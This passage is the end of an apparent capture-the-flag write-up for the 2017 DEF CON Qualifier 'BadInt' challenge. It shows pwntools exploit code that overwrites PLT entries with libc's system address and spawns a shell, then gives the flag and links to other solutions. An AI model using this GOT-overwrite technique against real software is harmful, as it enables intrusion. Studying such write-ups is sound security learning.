payload += p64(binary.plt['fgets'] + 6).encode('hex')                   # .plt _fgets addresss
payload += p64(binary.plt['strlen'] + 6).encode('hex')                  # .plt _strlen addresss
payload += p64(libc.symbols['system']).encode('hex')
payload += "L"*(110 - len(payload))
Add(1,0,payload,'No')

p.sendlineafter('SEQ #: ',"sh")
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | All ints are not the same... A239... Some can be bad ints! |

## **Related Site**

* <https://pastebin.com/4zxnJjcz>
* <https://kileak.github.io/ctf/2017/DefconQual-BadInt/>
* <http://bruce30262.logdown.com/posts/1784522>
* <https://stalkr.net/defcon/badint.py>